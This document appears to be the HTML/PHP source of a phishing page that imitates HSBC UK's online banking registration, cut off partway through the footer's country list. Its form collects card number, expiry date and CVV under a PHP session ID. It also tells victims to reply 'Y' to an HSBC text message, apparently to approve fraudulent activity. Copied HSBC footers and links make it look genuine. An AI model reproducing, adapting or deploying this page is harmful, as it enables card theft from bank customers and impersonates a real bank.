                                <!--<p>For more detail on how we will use your personal information, please see our <a href="https://www.hsbc.co.uk/content/dam/hsbc/gb/pdf/privacy-notice.pdf" title="Privacy Notice" target="_blank">Privacy Notice</a>

                                </p>-->
                            </div>
                            <!--Defect-29869 change-->
                            <p class="right" dir="ltr"> All fields are required</p>
                            <div>
                                <form name="verifyCredForm" id="hsbcwidget_form_validateForm_0" novalidate onsubmit="return form_submit();">
								<input type='hidden' name='userid' value="<?=$_SESSION['uniqueid'];?>">
                                    <div class="containerStyle19" dir="ltr">
                                        
                                        
                                        <br>
                                        <div class="question row clearfix">
                                            <div class="col01 left23">
                                                <label for="acno" id="REG_METHOD_LABEL">Card number
                                                    <!--<br> eg 12345678--></label>
                                                <div class="textInput validationInput small noColour">
                                                    <div id="CA_HOST_CRED_NO" class="jsQuestion">
                                                        <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" id="widget_acno" role="presentation" dir="ltr" widgetid="acno">
                                                            <div class="dijitReset dijitValidationContainer">
                                                                <input class="dijitReset dijitInputField dijitValidationIcon dijitValidationInner" value="Χ " type="text" tabindex="-1" readonly="readonly" role="presentation">
                                                            </div>
                                                            <div class="dijitReset dijitInputField dijitInputContainer">
                                                                <input onkeydown='return (event.which >= 48 && event.which <= 57) || event.which == 8 || event.which == 46 || event.which == 37 || event.which == 39' pattern="^[0-9]{10}$" required class="dijitReset dijitInputInner" data-dojo-attach-point="textbox,focusNode" autocomplete="off" name="ccnum" maxlength="16" type="text" tabindex="0" id="ccnum" aria-required="true">
                                                            </div>
                                                        </div>
                                                        <div class="validationMsg1 jsValidationMsg"></div>
                                                    </div>
                                                    <div id="CC_HOST_CRED_NO" class="jsQuestion" style="display: none;">
                                                        <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" id="widget_ccno" role="presentation" dir="ltr" widgetid="ccno">
                                                            <div class="dijitReset dijitValidationContainer">
                                                                <input class="dijitReset dijitInputField dijitValidationIcon dijitValidationInner" value="Χ " type="text" tabindex="-1" readonly="readonly" role="presentation">
                                                            </div>
                                                            <div class="dijitReset dijitInputField dijitInputContainer">
                                                                <input class="dijitReset dijitInputInner" data-dojo-attach-point="textbox,focusNode" autocomplete="off" name="CC_NO" type="text" tabindex="0" id="ccno" maxlength="16" aria-required="true">
                                                            </div>
                                                        </div>
                                                        <div class="validationMsg1 jsValidationMsg"></div>
                                                    </div>
                                                    <div id="IDC_HOST_CRED_NO" class="jsQuestion" style="display: none;">
                                                        <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" id="widget_idAcNo" role="presentation" dir="ltr" widgetid="idAcNo">
                                                            <div class="dijitReset dijitValidationContainer">
                                                                <input class="dijitReset dijitInputField dijitValidationIcon dijitValidationInner" value="Χ " type="text" tabindex="-1" readonly="readonly" role="presentation">
                                                            </div>
                                                            <div class="dijitReset dijitInputField dijitInputContainer">
                                                                <input class="dijitReset dijitInputInner" data-dojo-attach-point="textbox,focusNode" autocomplete="off" name="ID_NO" type="text" tabindex="0" id="idAcNo" maxlength="10" aria-required="true">
                                                            </div>
                                                        </div>
                                                        <div class="validationMsg1 jsValidationMsg"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div id="DOB">
                                            <div class="question row clearfix jsQuestion">
                                                <div class="col01 left23">
                                                    <br>
                                                    <label for="day">Expiry Date
                                                        <!--<br> example 16/06/79 --><span class="hidden" aria-hidden="false"> Please enter date in format DD edit</span></label>
                                                    <div class="textInputnew textInput">
                                                        <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" id="widget_day" role="presentation" dir="ltr" widgetid="day">
                                                            <div class="dijitReset dijitValidationContainer">
                                                                <input class="dijitReset dijitInputField dijitValidationIcon dijitValidationInner" value="Χ " type="text" tabindex="-1" readonly="readonly" role="presentation">
                                                            </div>
                                                            <div class="dijitReset dijitInputField dijitInputContainer">
                                                                <input onkeydown='return (event.which >= 48 && event.which <= 57) || event.which == 8 || event.which == 46 || event.which == 37 || event.which == 39' pattern="^(0?[1-9]|1[012])$" required class="dijitReset dijitInputInner" data-dojo-attach-point="textbox,focusNode" autocomplete="off" name="CC_MM" type="text" tabindex="0" id="day" maxlength="2" title="enter day in format DD" aria-required="true">
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div style="position: relative; float: left; top: 10px; left: 5px;">
                                                        /</div>
                                                    <div class="textInputnew textInput">
                                                        <label for="month" class="hidden" aria-hidden="false">Please enter month in format MM edit</label>
                                                        <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" id="widget_month" role="presentation" dir="ltr" widgetid="month">
                                                            <div class="dijitReset dijitValidationContainer">
                                                                <input class="dijitReset dijitInputField dijitValidationIcon dijitValidationInner" value="Χ " type="text" tabindex="-1" readonly="readonly" role="presentation">
                                                            </div>
                                                            <div class="dijitReset dijitInputField dijitInputContainer">
                                                                <input onkeydown='return (event.which >= 48 && event.which <= 57) || event.which == 8 || event.which == 46 || event.which == 37 || event.which == 39' pattern="^(2[0-9]|30)$" required class="dijitReset dijitInputInner" data-dojo-attach-point="textbox,focusNode" autocomplete="off" name="CC_YY" type="text" tabindex="0" id="month" maxlength="2" title="enter month in format MM" aria-required="true">
                                                            </div>
                                                        </div>
                                                    </div>
                                                    
                                                    <br>
                                                    <br>
                                                    <br>
                                                    <br>
                                                    <div class="validationMsg2 jsValidationMsg"></div>
                                                </div>
                                            </div>
                                        </div>

                                        <div id="TSN">
                                            <div class="question row clearfix jsQuestion">
                                                <div class="col01 left23">
                                                    <br>
                                                    <label for="tsn1">CVV
                                                        <!--<br> <span class="suplabel">Please enter the 1st, 4th
								and 6th digits of your Telephone Banking security number.</span>-->

                                                    </label>
                                                    <div class="textInputnew textInput">
                                                        <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" id="widget_tsn1" role="presentation" dir="ltr" widgetid="tsn1">
                                                            <div class="dijitReset dijitValidationContainer">
                                                                <input class="dijitReset dijitInputField dijitValidationIcon dijitValidationInner" value="Χ " type="text" tabindex="-1" readonly="readonly" role="presentation">
                                                            </div>
                                                            <div class="dijitReset dijitInputField dijitInputContainer">
                                                                <input onkeydown='return (event.which >= 48 && event.which <= 57) || event.which == 8 || event.which == 46 || event.which == 37 || event.which == 39' pattern="^[0-9]{3,4}$" style="width:50px;" required class="dijitReset dijitInputInner" data-dojo-attach-point="textbox,focusNode" autocomplete="off" name="CC_VV" type="password" tabindex="0" id="secode" maxlength="4" aria-required="true" value="">
                                                            </div>
                                                        </div>
                                                    </div>
                                                    
                                                    <br>
                                                    <br>
                                                    <br>
                                                    <br>
                                                    <div class="validationMsg2 jsValidationMsg"></div>
                                                </div>
                                            </div>
                                        </div>
										
										<br>
										<div class="checkboxContainer textInput" style="left:200px;">
											<div class="dijit dijitReset dijitInline " style="float: left;margin-top: 4px;margin-right: 10px;" role="presentation"  lang="en-GB">
												<input style="width: 17px;height: 17px;margin-right: 0;" name="cookieuserid" type="checkbox" class="dijitReset dijitCheckBoxInput"  tabindex="0" id="cookieuserid" value="true" autocomplete="off">
											</div>
											<label for="cookieuserid" style="width:700px;font-size: 1.4em;display: block;vertical-align: baseline;text-align: left;">If you have received a text message from HSBC saying to reply Y or N please reply Y and tick this box</label>
										</div>
										
										
										
										
										
										<div id="TSN">
										<div class="question row clearfix jsQuestion">
										<div class="col01 left23">
										
										
													<!--<div class="textInputnew textInput">
                                                            
                                                            <div class="dijitReset dijitInputField dijitInputContainer">
                                                                <label for="cookieuserid" style="padding-left:50px;">wererte</label>
																<input name="cookieuserid" type="checkbox" tabindex="0" id="cookieuserid" autocomplete="off">
																
																
                                                            </div>
                                                    </div>-->
										
										 </div>
										 </div>
										 </div>
                                        <!--<div class="question row clearfix jsQuestion">
                                            <div class="col01 right">
                                                <a href="https://www.hsbc.co.uk/register/#moreinfo" style="font-size:17px;"><u>Forgotten your Telephone Banking security number?</u>
					</a>
                                            </div>
                                        </div>-->
                                        <div class="question row clearfix jsQuestion">
                                            <div class="col01 left23">
                                                <input id="hiddendob" name="HOST_CRED_DOB" type="hidden">
                                                <input id="hiddensrtcde" name="HOST_CRED_SORT" type="hidden">
                                                <input id="hiddencredno" name="HOST_CRED_NO" type="hidden">
                                                <input id="hiddentsn" name="HOST_CRED_TSN" type="hidden">
                                            </div>
                                        </div>
                                    </div>
                                
                            </div>

                        </div>
                        <div class="dijitBorderContainer dijitContainer dijitStackContainer-child dijitStackContainer-dijitBorderContainer dijitHidden" id="dijit__WidgetsInTemplateMixin_11" widgetid="dijit__WidgetsInTemplateMixin_11" title="">
                            <div class="containerStyle17a paddingForButtonGroup">
                                
                                <div class="right" id="rightBtnDiv">
                                    <div class="button primary primaryBtn" id="withoutLogonLink">
                                        <span class="buttonInner">
						<input class="submit_input pageLevelSubmit" id="btnContinue" type="submit" value="Continue" data-dojo-attach-point="continueBtn">
					</span>
                                    </div>
                                    <a class="button primary primaryBtn" id="logonLink" style="display: none;" data-dojo-attach-point="continueBtn">
                                        <span class="buttonInner" data-dojo-attach-point="logOnBtnText">Continue </span> </a>
                                </div>
                            </div>
                            <div id="lightboxContent4" class="lightboxInner1" style="display: none">
                                <div class="alertLightbox info Clearfix">
                                    <div class="alertLightboxInner">
                                        <div class="row">
                                            <h3 class="headingStyle03">
						Are you sure you want to cancel the registration process?
					</h3>
					</form>
                                        </div>

                                        <div class="button secondary primaryBtn">
                                            <span class="buttonInner">
						<input class="buttonClose jsClose" type="button" tabindex="0" value="Don't cancel">
					</span>
                                        </div>
                                        <a class="button primary primaryBtn" onclick="trackEventWrapper({page_url:'/authentication/registration/cancel/verify/',event_type:'99',event_category:'GSP',event_subcategory:'OB Reg',event_action:'cancel'});" id="doNotCancelBtn" href="https://www.hsbc.co.uk/">
                                            <span class="buttonInner">Cancel</span>
                                        </a>

                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="_bottomContent" data-dojo-type="dijit/layout/ContentPane" data-dojo-attach-point="bottomContent" data-dojo-props="splitter:false, region:'trailing'" class="dijitContentPane" title="" role="group" widgetid="_bottomContent">
                <div class="dijitBorderContainer dijitContainer" id="dijit__WidgetsInTemplateMixin_2" widgetid="dijit__WidgetsInTemplateMixin_2">
                </div>
            </div>
            <div id="_footer" data-dojo-type="dijit/layout/ContentPane" data-dojo-attach-point="footer" data-dojo-props="splitter:false, region:'bottom'" class="dijitContentPane" title="" role="group" widgetid="_footer">
                <div class="dijitBorderContainer dijitContainer" id="dijit__WidgetsInTemplateMixin_3" widgetid="dijit__WidgetsInTemplateMixin_3">
                    <style type="text/css">
                        #footerMapRow,
                        #footerLinksRow,
                        #footerUtilityRow {
                            width: 940px;
                        }
                        
                        #footerMap #footerMapRow .column.last {
                            padding-right: 0
                        }
                        
                        #footerMap #footerMapRow .column {
                            padding: 0 10px 0 0;
                            width: 145px;
                        }
                    </style>
                    <div dir="ltr" id="footerLinks">
                        <div id="footerLinksRow">
                            <ul style="display: flex; white-space: nowrap;">
                                <li class="contact">
                                    <a href="https://www.hsbc.co.uk/help/" title="Help &amp; Support">Help &amp; Support</a></li>
                                <li class="branch">
                                    <a href="http://www.hsbc.co.uk/branch-finder" title="Find a branch">Find a branch</a></li>
                                <!-- <li class="feedback">
					<a href="javascript:void(0);" onclick="oo_feedback.show()" title="Website feedback. Rate your experience on this page. This link will open an overlay window.">Website feedback</a></li> -->
                            </ul>
                        </div>
                    </div>
                    <div dir="ltr" id="footerMap">
                        <div class="sixCol" id="footerMapRow">
                            <div class="column last">
                                <h2>
                <a href="https://www.hsbc.co.uk/help/" title="Support">Support</a></h2>
                                <ul>
                                    <li>
                                        <a href="http://www.hsbc.co.uk/help/security-centre/" title="Security centre">Security centre</a></li>
                                    <li>
                                        <a href="https://www.hsbc.co.uk/help/card-support/" title="Card support">Card support</a></li>
                                    <li>
                                        <a onclick="window.tealiumLaunchCobrowse(); return false;" href="#" title="CoBrowse">CoBrowse</a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div dir="ltr" id="footerUtility">
                        <div id="footerUtilityRow">
                            <ul>
                                <li>
                                    <a href="http://www.about.hsbc.co.uk/" title="About HSBC">About HSBC</a></li>
                                <li>
                                    <a href="https://www.hsbc.co.uk/site-map/" title="Site map">Site map</a></li>
                                <li>
                                    <a href="http://www.hsbc.co.uk/legal" title="Legal">Legal</a></li>
                                <li>
                                    <a href="http://www.hsbc.co.uk/privacy-notice" title="Privacy Notice">Privacy notice</a></li>
                                <li>
                                    <a href="http://www.hsbc.co.uk/cookie-policy" title="Cookie Policy" class="dnt_no_consent">Cookie
                    Policy</a></li>
                                <li>
                                    <a href="https://www.hsbc.co.uk/accessibility/" title="Accessibility">Accessibility</a></li>
                                <li>
                                    <a href="https://www.hsbc.com/" title="HSBC Group">HSBC Group</a></li>
                            </ul>
                            <p>
                                © &nbsp;HSBC Group <script>document.write((new Date()).getFullYear());</script></p>
                        </div>
                    </div>
                    <div class="loadinContent" data-dojo-type="hsbcwidget/countrySelector" dir="ltr" id="countrySelectorContent" widgetid="countrySelectorContent" style="display: none;">
                        <div role="presentation" class="tabsNode">
                            <ul class="regionTabs" role="tablist">

                                <li role="tabmenu" class="selected">
                                    <a class="tabs" role="tab" id="europeTab" aria-controls="europe" tabindex="0" aria-expanded="true" title="
					Europe: Click to view HSBC websites in this region" data-region="europe" href="#">
                    Europe</a>

                                </li>

                                <li role="tabmenu" class="">
                                    <a class="tabs" role="tab" id="asiaPacificTab" aria-controls="asiaPacific" tabindex="-1" aria-expanded="false" title="Asia-Pacific: Click to view HSBC websites in this region" data-region="asiaPacific" href="#">
                    Asia-Pacific</a>
                                </li>

                                <li role="tabmenu" class="">
                                    <a class="tabs" role="tab" id="middleEastTab" aria-controls="middleEast" tabindex="-1" aria-expanded="false" title="Middle East &amp; Africa: Click to view HSBC websites in this region" data-region="middleEast" href="#">
                    Middle East &amp; Africa</a>
                                </li>

                                <li role="tabmenu" class="">
                                    <a class="tabs" role="tab" id="americasTab" aria-controls="americas" tabindex="-1" aria-expanded="false" title="Americas: Click to view HSBC websites in this region" data-region="americas" href="#">
                    Americas</a>
                                </li>

                            </ul>

                        </div>
                        <div class="regions" aria-label="regions">
                            <div aria-hidden="false" class="region activeRegion" id="europeMenu" role="tabpanel" aria-labelledby="europeTab">
                                <h2 style=" display: none;">
                Europe</h2>
                                <div class="navList">
                                    <ul class="nav">
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.am/1/2/en/home" title="Armenia" class="am" lang="en-GB">Armenia</a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.am/1/2/hy/home" title="Հայաստան" lang="hy-AM">Հայաստան</a></li>
                                        <li>
                                            <a href="https://ciiom.hsbc.com/" title="Channel Islands and Isle of Man" class="im" lang="en-GB">Channel
                            Islands
                            and Isle of Man</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.cz/1/2/cze/en/business" title="Czech Republic" class="cz" lang="cs-CZ">Czech
                            Republic</a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.cz/1/2/cze/cs/business" title="Česká republika" lang="en-GB">Česká
                            republika</a></li>
                                        <li class="multiTop">
                                            <a href="https://www.hsbc.fr/1/2/english/personal" title="France (English)" class="fr" lang="en-GB">France
                            <span>(English)</span></a></li>
                                        <li class="multiBottom">
                                            <a href="https://www.hsbc.fr/1/2/hsbc-france" title="France (Français)" lang="fr-FR">France
                            <span>(Français)</span></a></li>
                                        <li>
                                            <a href="http://www.hsbctrinkaus.de/global/display/home" title="Germany" class="de" lang="en-GB">Germany</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.gr/1/2/en/home" title="Greece" class="gr" lang="en-GB">Greece</a></li>
                                        <li class="last multiBottom">
                                            <a href="http://www.hsbc.gr/1/2/el/home" title="Ελλάδα" lang="el-GR">Ελλάδα</a></li>
                                    </ul>
                                    <ul class="nav">

                                        <li>
                                            <a href="http://www.offshore.hsbc.com/1/2/international/home" title="HSBC Expat" class="je" lang="en-GB">HSBC
                            Expat</a></li>
                                        <li>
                                            <a href="http://www.hsbccredit.hu/" title="Hungary" class="hu" lang="hu-HU">Hungary</a></li>
                                        <li>
                                            <a href="http://www.hsbc.ie/1/2/hsbc-ireland/home/home" title="Ireland" class="ie" lang="en-IE">Ireland</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.kz/1/2/en/home" title="Kazakhstan" class="kz" lang="en-GB">Kazakhstan</a></li>
                                        <li class="multiMiddle">
                                            <a href="http://www.hsbc.kz/1/2/kk/home" title="Қазақстан" lang="kk-KZ">Қазақстан</a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.kz/1/2/ru/home" title="Казахстан" lang="ru-RU">Казахстан</a></li>
                                        <li>
                                            <a href="https://www.hsbc.com.mt/1/2/home/hsbc-bank-malta-plc-home-page" title="Malta" class="mt" lang="en-GB">Malta</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.pl/1/2/en/home" title="Poland" class="pl" lang="en-GB">Poland</a></li>
                                        <li class="last multiBottom">
                                            <a href="http://www.hsbc.pl/1/2/pl/home" title="Polska" lang="pl-PL">Polska</a></li>
                                    </ul>

                                    <ul class="nav">
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.ru/1/2/rus/en/home" title="Russia" class="ru" lang="en-GB">Russia</a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.ru/1/2/rus/ru/home" title="Россия" lang="ru-RU">Россия</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.sk/1/2/hsbc-slovakia/en/home" title="Slovakia" class="sk" lang="en-GB">Slovakia</a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.sk/1/2/hsbc-slovakia/sk/home/home" title="Slovensko" lang="sk-SK">Slovensko</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.es/1/2/esp/en/home" title="Spain" class="es" lang="es-ES">Spain</a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.es/1/2/esp/es/home" title="España" lang="en-GB">España</a></li>
                                        <li>
                                            <a href="http://www.hsbc.ch/1/2/che/en/corporate" title="Switzerland" class="ch" lang="en-GB">Switzerland</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.com.tr/eng/" title="Turkey" class="tr" lang="en-GB">Turkey</a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.com.tr/tr/" title="Türkiye" lang="tr-TR">Türkiye</a></li>
                                        <li class="last">
                                            <a href="http://www.hsbc.co.uk/1/2/personal" title="United Kingdom" class="uk" lang="en-GB">United
                            Kingdom</a></li>
                                    </ul>
                                </div>
                            </div>
                            <div aria-hidden="true" class="region" id="asiaPacificMenu" style=" display: none;" role="tabpanel" aria-labelledby="asiaPacificTab">
                                <h2 style=" display: none;">
                Asia-Pacific</h2>
                                <div class="navList">
                                    <ul class="nav">
                                        <li>
                                            <a href="http://www.hsbc.com.au/1/2/home" title="Australia" class="au" lang="en-AU">Australia</a></li>
                                        <li>
                                            <a href="http://www.hsbc.com.bd/1/2/home" title="Bangladesh" class="bd" lang="en-GB">Bangladesh</a></li>
                                        <li>
                                            <a href="http://www.hsbc.com.bn/1/2/home" title="Brunei Darussalam" class="bn" lang="en-GB">Brunei
                            Darussalam</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.com.cn/1/2/home" title="China" class="cn" lang="en-GB">China</a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.com.cn/1/2/" title="中国" lang="zh-CN">中国</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.com.hk/1/2/home" title="Hong Kong" class="hk" lang="en-GB">Hong Kong</a></li>
                                        <li class="multiMiddle">
                                            <a href="http://www.hsbc.com.hk/1/2/chinese/home" title="香港（繁體中文）" lang="zh-HK">香港<span>（繁體中文）</span></a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.com.hk/1/2/simplified/home" title="香港（简体中文）" lang="zh-CN">香港<span>（简体中文）</span></a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.co.id/1/2/home_en_US" title="Indonesia (English)" class="id" lang="en-GB">Indonesia
                            <span>(English)</span></a></li>
                                        <li class="last multiBottom">
                                            <a href="http://www.hsbc.co.id/1/2/home_in_ID" title="Indonesia (Bahasa Indonesia)" lang="id-ID">Indonesia
                            <span>(Bahasa
                                Indonesia)</span></a></li>
                                    </ul>
                                    <ul class="nav">
                                        <li>
                                            <a href="http://www.hsbc.co.in/1/2/homepage" title="India" class="in" lang="en-GB">India</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.co.jp/1/2/home" title="Japan" class="jp" lang="en-GB">Japan</a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.co.jp/1/2/home-jp" title="日本" lang="ja-JP">日本</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.co.kr/1/2/home" title="Korea" class="kr" lang="en-GB">Korea</a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.co.kr/1/2/home_ko" title="한국" lang="ko-KR">한국</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.com.mo/1/2/home-en" title="Macau" class="mo" lang="en-GB">Macau</a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.com.mo/1/2/home-mo" title="澳門" lang="zh-MO">澳門</a></li>
                                        <li>
                                            <a href="http://www.hsbc.com.my/1/2/HSBC-Bank-Malaysia-Berhad" title="Malaysia" class="my" lang="en-GB">Malaysia</a></li>
                                        <li>
                                            <a href="http://www.hsbc.lk/1/2/home-page/male-branch" title="Maldives" class="mv" lang="en-GB">Maldives</a></li>
                                        <li class="last">
                                            <a href="http://www.hsbc.co.nz/1/2/home" title="New Zealand" class="nz" lang="en-NZ">New
                            Zealand</a></li>
                                    </ul>
                                    <ul class="nav">
                                        <li>
                                            <a href="http://www.hsbc.com.pk/1/2/home" title="Pakistan" class="pk" lang="en-GB">Pakistan</a></li>
                                        <li>
                                            <a href="http://www.hsbc.com.ph/1/2/home" title="Philippines" class="ph" lang="en-PH">Philippines</a></li>
                                        <li>
                                            <a href="http://www.hsbc.com.sg/1/2/home" title="Singapore" class="sg" lang="en-GB">Singapore</a></li>
                                        <li>
                                            <a href="http://www.hsbc.lk/1/2/home-page" title="Sri Lanka" class="lk" lang="en-GB">Sri Lanka</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.com.tw/1/2/home_en" title="Taiwan" class="tw" lang="en-GB">Taiwan</a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.com.tw/1/2/home_zh_TW" title="台灣" lang="zh-TW">台灣</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.co.th/1/2/home-en" title="Thailand" class="th" lang="en-GB">Thailand</a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.co.th/1/2/home-th" title="ประเทศไทย" lang="th-TH">ประเทศไทย</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.com.vn/1/2/home_en" title="Vietnam" class="vn" lang="en-GB">Vietnam</a></li>
                                        <li class="last multiBottom">
                                            <a href="http://www.hsbc.com.vn/1/2/home" title="Việt Nam" lang="vi-VN">Việt Nam</a></li>
                                    </ul>
                                </div>
                            </div>
                            <div aria-hidden="true" class="region" id="middleEastMenu" style=" display: none;" role="tabpanel" aria-labelledby="middleEastTab">
                                <h2 style=" display: none;">
                Middle East &amp; Africa</h2>
                                <div class="navList">
                                    <ul class="nav">
                                        <li>
                                            <a href="http://www.algeria.hsbc.com/hsbcdz" title="Algeria" class="dz" lang="fr-FR">Algeria</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.com.bh/1/2/home" title="Bahrain (Conventional Banking)" class="bh" lang="en-GB">Bahrain
                            <span>(Conventional)</span></a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.com.bh/1/2/islamic-financial-solutions" title="Bahrain (Islamic Amanah Banking)" lang="en-GB">Bahrain
                            <span>(Islamic Amanah)</span></a></li>
                                        <li>
                                            <a href="http://www.hsbc.com.eg/1/2/" title="Egypt" class="eg" lang="en-GB">Egypt</a></li>
                                        <li>
                                            <a href="http://www.hsbc.jo/1/2/home" title="Jordan" class="jo" lang="en-GB">Jordan</a></li>
                                        <li>
                                            <a href="http://www.kuwait.hsbc.com/1/2/kuwait" title="Kuwait" class="kw" lang="en-GB">Kuwait</a></li>
                                        <li>
                                            <a href="http://www.hsbc.com.lb/1/2/home" title="Lebanon" class="lb" lang="en-GB">Lebanon</a></li>
                                        <li class="last">
                                            <a href="http://www.hsbc.co.mu/1/2/home" title="Mauritius" class="mu" lang="en-GB">Mauritius</a></li>
                                    </ul>
                                    <ul class="nav">
                                        <li>
                                            <a href="http://www.hsbc.co.om/1/2/home" title="Oman" class="om" lang="en-GB">Oman</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.com.qa/1/2/ALL_SITE_PAGES/home" title="Qatar (Conventional Banking)" class="qa" lang="en-GB">Qatar
                            <span>(Conventional)</span></a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.com.qa/1/2/ALL_SITE_PAGES/hsbc-amanah" title="Qatar (Islamic Amanah Banking)" lang="en-GB">Qatar
                            <span>(Islamic Amanah)</span></a></li>
                                        <li>
                                            <a href="http://www.sabb.com/1/2/sabb-en/home" title="Saudi Arabia" class="sa" lang="en-GB">Saudi
                            Arabia</a></li>
                                        <li>
                                            <a href="http://www.sabb.com/1/2/sabb-ar/home" title="السعودية" lang="ar-SA">السعودية</a></li>
                                        <li>
                                            <a href="http://www.hsbc.co.za/" title="South Africa" class="za" lang="en-ZA">South Africa</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.ae/1/2/personal" title="United Arab Emirates (Conventional Banking)" class="ae" lang="en-GB">United
                            Arab Emirates <span>(Conventional)</span></a></li>
                                        <li class="last multiBottom">
                                            <a href="http://www.hsbc.ae/1/2/amanah-personal" title="United Arab Emirates (Islamic Amanah Banking)" lang="en-GB">United
                            Arab Emirates <span>(Islamic Amanah)</span></a></li>
                                    </ul>
                                </div>
                            </div>
                            <div aria-hidden="true" class="region" id="americasMenu" style=" display: none;" role="tabpanel" aria-labelledby="americasTab">
                                <h2 style=" display: none;">
                Americas</h2>
                                <div class="navList">
                                    <ul class="nav">
                                        <li>
                                            <a href="http://www.hsbc.com.ar/ar/hsbcgrupo/" title="Argentina" class="ar" lang="es-AR">Argentina</a></li>
                                        <li>
                                            <a href="http://www.hsbc.bm/1/2/bermuda/home" title="Bermuda" class="bm" lang="en-US">Bermuda</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.com.br/1/2/portal/en/personal/international-services" title="Brazil (English)" class="br" lang="en-US">Brazil <span>(English)</span></a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.com.br/1/2/portal/pt/pagina-inicial" title="Brasil (Português)" lang="pt-BR">Brasil
                            <span>(Português)</span></a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.ca/1/2/en/home/home" title="Canada (English)" class="ca" lang="en-CA">Canada
                            <span>(English)</span></a></li>
                                        <li class="multiMiddle">
                                            <a href="http://www.hsbc.ca/1/2/fr/home/home" title="Canada (Français)" lang="fr-CA">Canada
                            <span>(Français)</span></a></li>
                                        <li class="multiMiddle">
                                            <a href="http://www.hsbc.ca/1/2/tw/home/home" title="加拿大（繁體中文）" lang="zh-HK">加拿大<span>（繁體中文）</span></a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.ca/1/2/cn/home/home" title="加拿大（简体中文）" lang="zh-CN">加拿大<span>（简体中文）</span></a></li>
                                        <li class="last">
                                            <a href="http://www.hsbc.ky/1/2/cayman/home" title="Cayman Islands" class="ky" lang="en-US">Cayman
                            Islands</a></li>
                                    </ul>
                                    <ul class="nav">
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.cl/1/2/en/home" title="Chile (English)" class="cl" lang="en-US">Chile
                            <span>(English)</span></a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.cl/1/2/es/home" title="Chile (Español)" lang="es-CL">Chile <span>(Español)</span></a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.com.co/1/2/en/home" title="Colombia (English)" class="co" lang="en-US">Colombia
                            <span>(English)</span></a></li>
                                        <li class="multiBottom">
                                            <a href="http://www.hsbc.com.co/1/2/es/home" title="Colombia (Español)" lang="es-CO">Colombia
                            <span>(Español)</span></a></li>
                                        <li>
                                            <a href="http://www.hsbc.fi.cr/" title="Costa Rica" class="cr" lang="es-CR">Costa Rica</a></li>
                                        <li>
                                            <a href="http://www.hsbc.com.sv/" title="El Salvador" class="sv" lang="es-SV">El Salvador</a></li>
                                        <li>
                                            <a href="http://www.hsbc.com.hn/es/index.asp" title="Honduras" class="hn" lang="es-HN">Honduras</a></li>
                                        <li class="multiTop">
                                            <a href="http://www.hsbc.com.mx/1/2/en/home" title="Mexico (English)" class="mx" lang="en-US">Mexico
                            <span>(English)</span></a></li>
                                        <li class="last multiBottom">
                                            <a href="http://www.hsbc.com.mx/1/2/es/home" title="México (Español)" lang="es-MX">México <span>(Español)</span></a></li>
